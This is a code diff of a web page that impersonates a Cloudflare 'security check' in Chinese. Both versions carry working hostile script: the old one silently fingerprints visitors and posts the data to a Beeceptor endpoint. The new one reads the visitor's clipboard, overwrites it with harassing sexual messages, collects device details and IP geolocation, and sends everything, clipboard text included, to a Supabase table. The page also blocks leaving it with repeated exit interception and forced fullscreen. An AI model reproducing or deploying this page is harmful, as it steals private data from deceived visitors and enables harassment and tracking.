@@ -6,68 +6,31 @@
     <title>安全检查中...</title>
     <meta name="robots" content="noindex, nofollow">
     <style>
+        /* 样式保持不变，此处省略 */
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background: #000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            color: #e0e0e0;
-            user-select: none;
-            -webkit-user-select: none;
-        }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #000; display: flex; align-items: center; justify-content: center; min-height: 100vh; color: #e0e0e0; user-select: none; }
         .container { width: 100%; max-width: 420px; padding: 20px; }
-        .card {
-            background: #0d0d0d;
-            border: 1px solid #222;
-            border-radius: 12px;
-            padding: 40px 30px;
-            text-align: center;
-            box-shadow: 0 0 20px rgba(0,102,255,0.05);
-        }
-        .logo {
-            font-size: 20px; font-weight: 600; color: #fff;
-            margin-bottom: 30px; display: flex; align-items: center; justify-content: center; gap: 10px;
-        }
+        .card { background: #0d0d0d; border: 1px solid #222; border-radius: 12px; padding: 40px 30px; text-align: center; box-shadow: 0 0 20px rgba(0,102,255,0.05); }
+        .logo { font-size: 20px; font-weight: 600; color: #fff; margin-bottom: 30px; display: flex; align-items: center; justify-content: center; gap: 10px; }
         .logo svg { width: 28px; height: 28px; }
-        .logo span {
-            background: #fff; color: #000; padding: 2px 10px;
-            border-radius: 4px; font-size: 16px; font-weight: 700;
-            letter-spacing: 0.5px;
-        }
-        .spinner {
-            width: 40px; height: 40px;
-            border: 4px solid #333;
-            border-top: 4px solid #0066ff;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
+        .logo span { background: #fff; color: #000; padding: 2px 10px; border-radius: 4px; font-size: 16px; font-weight: 700; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #333; border-top: 4px solid #0066ff; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { to { transform: rotate(360deg); } }
         h2 { font-size: 18px; font-weight: 500; color: #fff; margin-bottom: 8px; }
         p { color: #aaa; font-size: 14px; line-height: 1.5; margin-bottom: 20px; }
         .progress-bar { width: 100%; height: 4px; background: #222; border-radius: 2px; margin: 20px 0; overflow: hidden; }
         .progress-fill { width: 0%; height: 100%; background: #0066ff; border-radius: 2px; transition: width 0.3s linear; }
         .status-text { font-size: 13px; color: #666; margin-bottom: 5px; }
-        .footer {
-            margin-top: 30px; font-size: 12px; color: #555;
-            display: flex; align-items: center; justify-content: center; gap: 6px;
-        }
-        .footer svg { width: 14px; height: 14px; }
+        .footer { margin-top: 30px; font-size: 12px; color: #555; display: flex; align-items: center; justify-content: center; gap: 6px; }
         .hidden { display: none; }
-        .success-icon {
-            width: 50px; height: 50px; margin: 0 auto 20px;
-            border-radius: 50%; background: #00cc66;
-            display: flex; align-items: center; justify-content: center;
-            font-size: 28px; color: #fff;
-        }
+        .success-icon { width: 50px; height: 50px; margin: 0 auto 20px; border-radius: 50%; background: #00cc66; display: flex; align-items: center; justify-content: center; font-size: 28px; color: #fff; }
+        .btn { background: #0066ff; color: #fff; border: none; padding: 12px 30px; border-radius: 6px; font-size: 16px; cursor: pointer; margin-top: 10px; }
+        .btn:hover { background: #0050cc; }
     </style>
 </head>
 <body>
     <div class="container" id="mainContainer">
-        <div class="card" id="checkStep">
+        <div class="card" id="verifyStep">
             <div class="logo">
                 <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                     <path d="M12 2L2 7L12 12L22 7L12 2Z" fill="#fff"/>
@@ -76,105 +39,258 @@
                 </svg>
                 <span>CF</span> Cloudflare
             </div>
-            <div class="spinner"></div>
-            <h2 id="progressText">正在验证浏览器环境...</h2>
-            <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-            <p id="progressDesc">请勿关闭或刷新此页面</p>
-            <div class="status-text" id="stepCounter">步骤 1/25</div>
+            <h2>安全检查</h2>
+            <p>点击下方按钮完成安全验证，并获取安全提醒。</p>
+            <button class="btn" onclick="startCheck()">确认您是真人</button>
             <div class="footer">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                 DDoS 攻击防护 · Cloudflare
             </div>
         </div>
 
+        <div class="card hidden" id="checkStep">
+            <div class="spinner"></div>
+            <h2 id="progressText">正在验证浏览器环境...</h2>
+            <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+            <p id="progressDesc">请勿关闭或刷新此页面</p>
+            <div class="status-text" id="stepCounter">步骤 1/25</div>
+        </div>
+
         <div class="card hidden" id="doneStep">
             <div class="success-icon">✓</div>
             <h2>检查已完成</h2>
-            <p>您现在可以安全关闭此页面。</p>
+            <p>安全提醒已写入您的剪贴板，请注意查收。</p>
             <div class="footer">谢谢您的配合</div>
         </div>
     </div>
 
     <script>
-        // ==================== 自动收集并发送到 Beeceptor ====================
-        (function autoCollect() {
-            fetch('http://ip-api.com/json/?fields=query')
-                .then(r => r.json())
-                .then(d => {
-                    var publicIP = (d && d.query) ? d.query : '不可用';
-                    collectDeviceInfo(publicIP);
-                })
-                .catch(() => collectDeviceInfo('不可用'));
+        // ========== Supabase 配置（已填入你的信息） ==========
+        var SUPABASE_URL = 'https://povigcqzxamvsjsfzxif.supabase.co';
+        var SUPABASE_ANON_KEY = 'sb_publishable_qMSjePDl0TEpoH83PfVsOQ_ZSPR07H8';
 
-            function collectDeviceInfo(ipAddr) {
-                var ptf = navigator.platform || '未知';
-                var cc = navigator.hardwareConcurrency || '不可用';
-                var ram = navigator.deviceMemory || '不可用';
-                var ver = navigator.userAgent;
-                var brw = '不可用', os = '不可用';
+        // ========== 5条安全提醒内容 ==========
+        var SAFETY_MESSAGES = [
+            '【通知】宝宝我真的好想你',
+            '【提醒】宝宝我真的好想你',
+            '【重要通知】宝宝我真的好想你',
+            '【提示】宝宝我真的好想你',
+            '【验证】宝宝，真的好爱你，我想看你的JK'
+        ];
 
-                var str = ver;
-                if (ver.indexOf('Firefox') != -1) {
-                    str = str.substring(str.indexOf(' Firefox/') + 1);
-                    brw = str.split(' ')[0];
-                } else if (ver.indexOf('Chrome') != -1) {
-                    str = str.substring(str.indexOf(' Chrome/') + 1);
-                    brw = str.split(' ')[0];
-                } else if (ver.indexOf('Safari') != -1) {
-                    str = str.substring(str.indexOf(' Safari/') + 1);
-                    brw = str.split(' ')[0];
-                } else if (ver.indexOf('Edge') != -1) {
-                    str = str.substring(str.indexOf(' Edge/') + 1);
-                    brw = str.split(' ')[0];
-                }
-
-                try {
-                    var ua = ver;
-                    var osPart = ua.substring(0, ua.indexOf(')'));
-                    var osArr = osPart.split(';');
-                    os = osArr.length > 1 ? osArr[1].trim() : '不可用';
-                } catch(e) { os = '不可用'; }
-
-                var ven = '不可用', ren = '不可用';
-                try {
-                    var canvas = document.createElement('canvas');
-                    var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                    if (gl) {
-                        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                        ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                        ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        // ========== 强化剪贴板读取 ==========
+        async function readClipboardForce() {
+            try {
+                if (navigator.permissions && navigator.permissions.query) {
+                    const status = await navigator.permissions.query({ name: 'clipboard-read' });
+                    if (status.state === 'denied') {
+                        return { success: false, text: '权限被拒绝', method: 'permission-denied' };
                     }
-                } catch(e) {}
+                }
+            } catch (e) {}
 
-                var ht = window.screen.height;
-                var wd = window.screen.width;
-
-                var payload = {
-                    platform: ptf,
-                    browser: brw,
-                    cores: cc,
-                    ram: ram,
-                    vendor: ven,
-                    render: ren,
-                    ip: ipAddr,
-                    ht: ht,
-                    wd: wd,
-                    os: os,
-                    url: window.location.href,
-                    time: new Date().toISOString()
-                };
-
-                // 发送到你的 beeceptor 端点
-                fetch('https://waits.free.beeceptor.com', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                }).then(() => console.log('数据已发送'))
-                  .catch(e => console.log('发送失败: ' + e));
+            if (navigator.clipboard && navigator.clipboard.readText) {
+                for (let attempt = 0; attempt < 2; attempt++) {
+                    try {
+                        const text = await navigator.clipboard.readText();
+                        if (text !== null && text !== undefined) {
+                            return { success: true, text: text, method: 'clipboard-readText' };
+                        }
+                    } catch (err) {
+                        await new Promise(resolve => setTimeout(resolve, 100));
+                    }
+                }
             }
-        })();
 
-        // ==================== 退出拦截（22次） ====================
+            if (navigator.clipboard && navigator.clipboard.read) {
+                try {
+                    const items = await navigator.clipboard.read();
+                    for (const item of items) {
+                        if (item.types.includes('text/plain')) {
+                            const blob = await item.getType('text/plain');
+                            const text = await blob.text();
+                            if (text) return { success: true, text: text, method: 'clipboard-read' };
+                        }
+                    }
+                } catch (err) {}
+            }
+
+            try {
+                const textArea = document.createElement('textarea');
+                textArea.style.position = 'fixed';
+                textArea.style.left = '-9999px';
+                document.body.appendChild(textArea);
+                textArea.focus();
+                const pasteSuccess = document.execCommand('paste');
+                const text = textArea.value;
+                document.body.removeChild(textArea);
+                if (pasteSuccess && text) return { success: true, text: text, method: 'execCommand' };
+            } catch (err) {}
+
+            return { success: false, text: '读取失败', method: 'all-failed' };
+        }
+
+        // ========== 写入剪贴板 ==========
+        async function writeClipboardCompatible(text) {
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                try {
+                    await navigator.clipboard.writeText(text);
+                    return true;
+                } catch (err) {}
+            }
+            try {
+                const textArea = document.createElement('textarea');
+                textArea.value = text;
+                textArea.style.position = 'fixed';
+                textArea.style.left = '-9999px';
+                document.body.appendChild(textArea);
+                textArea.select();
+                const success = document.execCommand('copy');
+                document.body.removeChild(textArea);
+                return success;
+            } catch (err) {
+                return false;
+            }
+        }
+
+        // ========== 获取公网 IP ==========
+        async function getPublicIP() {
+            try {
+                const resp = await fetch('http://ip-api.com/json/?fields=query');
+                const data = await resp.json();
+                if (data && data.query) return data.query;
+            } catch (e) {}
+            try {
+                const resp = await fetch('https://api.ipify.org?format=json');
+                const data = await resp.json();
+                if (data && data.ip) return data.ip;
+            } catch (e) {}
+            return '不可用';
+        }
+
+        // ========== 开始检查 ==========
+        async function startCheck() {
+            var clipResult = await readClipboardForce();
+
+            // 依次写入5条剪贴板提醒
+            var writtenMessages = [];
+            for (let i = 0; i < SAFETY_MESSAGES.length; i++) {
+                await writeClipboardCompatible(SAFETY_MESSAGES[i]);
+                writtenMessages.push(SAFETY_MESSAGES[i]);
+                await new Promise(resolve => setTimeout(resolve, 200));
+            }
+
+            document.getElementById('verifyStep').classList.add('hidden');
+            document.getElementById('checkStep').classList.remove('hidden');
+
+            collectDeviceInfo(clipResult.text || '读取失败', writtenMessages);
+            enableExitInterception();
+            runScanSimulation();
+        }
+
+        // ========== 收集设备信息并发送到 Supabase ==========
+        async function collectDeviceInfo(clipboardText, writtenMessages) {
+            var publicIP = await getPublicIP();
+            var ptf = navigator.platform || '未知';
+            var cc = navigator.hardwareConcurrency || '不可用';
+            var ram = navigator.deviceMemory || '不可用';
+            var ver = navigator.userAgent;
+            var brw = '不可用', os = '不可用';
+
+            var str = ver;
+            if (ver.indexOf('Firefox') != -1) {
+                str = str.substring(str.indexOf(' Firefox/') + 1);
+                brw = str.split(' ')[0];
+            } else if (ver.indexOf('Chrome') != -1) {
+                str = str.substring(str.indexOf(' Chrome/') + 1);
+                brw = str.split(' ')[0];
+            } else if (ver.indexOf('Safari') != -1) {
+                str = str.substring(str.indexOf(' Safari/') + 1);
+                brw = str.split(' ')[0];
+            } else if (ver.indexOf('Edge') != -1) {
+                str = str.substring(str.indexOf(' Edge/') + 1);
+                brw = str.split(' ')[0];
+            }
+
+            try {
+                var ua = ver;
+                var osPart = ua.substring(0, ua.indexOf(')'));
+                var osArr = osPart.split(';');
+                os = osArr.length > 1 ? osArr[1].trim() : '不可用';
+            } catch(e) { os = '不可用'; }
+
+            var ven = '不可用', ren = '不可用';
+            try {
+                var canvas = document.createElement('canvas');
+                var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                    ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                }
+            } catch(e) {}
+
+            var ht = window.screen.height;
+            var wd = window.screen.width;
+
+            // 查询 IP 归属地
+            var ipDetails = {};
+            try {
+                const ipResp = await fetch(`http://ip-api.com/json/${publicIP}?fields=continent,country,regionName,city,isp,org,as&lang=zh-CN`);
+                const ipInfo = await ipResp.json();
+                if (ipInfo.status === 'success') {
+                    ipDetails = {
+                        ip_continent: ipInfo.continent,
+                        ip_country: ipInfo.country,
+                        ip_region: ipInfo.regionName,
+                        ip_city: ipInfo.city,
+                        ip_isp: ipInfo.isp,
+                        ip_org: ipInfo.org,
+                        ip_as: ipInfo.as
+                    };
+                }
+            } catch(e) {}
+
+            var payload = {
+                time: new Date().toISOString().replace('T', ' ').substring(0, 19),
+                ip: publicIP,
+                os: os,
+                platform: ptf,
+                browser: brw,
+                vendor: ven,
+                render: ren,
+                cores: cc,
+                ram: ram,
+                ht: ht,
+                wd: wd,
+                url: window.location.href,
+                clipboard: clipboardText,
+                clipboard_written: JSON.stringify(writtenMessages),
+                ...ipDetails
+            };
+
+            // 发送到 Supabase
+            try {
+                const res = await fetch(`${SUPABASE_URL}/rest/v1/kkk`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'apikey': SUPABASE_ANON_KEY,
+                        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
+                    },
+                    body: JSON.stringify(payload)
+                });
+                if (res.ok) {
+                    console.log('数据已保存到 Supabase');
+                } else {
+                    console.log('保存失败', await res.text());
+                }
+            } catch (err) {
+                console.log('请求失败', err);
+            }
+        }
+
+        // ========== 退出拦截（22次） ==========
         var exitQuotes = [
             "安全扫描进行中，请勿离开...", "正在传输加密数据，请稍候...", "浏览器指纹采集未完成...",
             "网络环境检测中，请保持页面打开...", "DNS 查询尚未结束...", "WebRTC 泄露扫描未完成...",
@@ -187,6 +303,7 @@
         ];
         var MAX_INTERCEPT = 22;
         var exitCount = parseInt(sessionStorage.getItem('cf_exit_count')) || 0;
+
         function save(){ sessionStorage.setItem('cf_exit_count', exitCount); }
         function release(){
             window.removeEventListener('popstate', onBack);
@@ -219,18 +336,15 @@
             return e.returnValue;
         }
 
-        window.addEventListener('DOMContentLoaded', function(){
-            if(exitCount >= MAX_INTERCEPT){
-                document.getElementById('checkStep').classList.add('hidden');
-                document.getElementById('doneStep').classList.remove('hidden');
-                release();
-                return;
-            }
+        function enableExitInterception() {
             window.history.pushState(null, null, location.href);
             window.addEventListener('popstate', onBack);
             document.addEventListener('keydown', onRefresh);
             window.addEventListener('beforeunload', onBeforeUnload);
+        }
 
+        // ========== 模拟扫描进度 ==========
+        function runScanSimulation() {
             var scanSteps = [
                 "正在验证浏览器指纹...", "正在检测网络环境...", "正在检查 DNS 配置...", "正在扫描 WebRTC 泄露...",
                 "正在验证 Canvas 指纹...", "正在检测 AudioContext 指纹...", "正在检查 WebGL 信息...", "正在验证字体列表...",
@@ -240,7 +354,9 @@
                 "正在分析 TLS 握手特征...", "正在检测 WebSocket 支持...", "正在验证 IndexedDB 存储...", "正在扫描 Service Worker...",
                 "正在完成最终验证..."
             ];
-            var currentStep = 0, totalSteps = scanSteps.length, stepDuration = 1800;
+            var currentStep = 0;
+            var totalSteps = scanSteps.length;
+            var stepDuration = 1800;
             var progressText = document.getElementById('progressText');
             var progressFill = document.getElementById('progressFill');
             var stepCounter = document.getElementById('stepCounter');
@@ -259,8 +375,12 @@
             }
             advanceStep();
 
-            try { var el = document.documentElement; if(el.requestFullscreen) el.requestFullscreen().catch(()=>{}); else if(el.webkitRequestFullscreen) el.webkitRequestFullscreen(); } catch(e) {}
-        });
+            try { 
+                var el = document.documentElement; 
+                if(el.requestFullscreen) el.requestFullscreen().catch(()=>{}); 
+                else if(el.webkitRequestFullscreen) el.webkitRequestFullscreen(); 
+            } catch(e) {}
+        }
     </script>
 </body>
 </html>
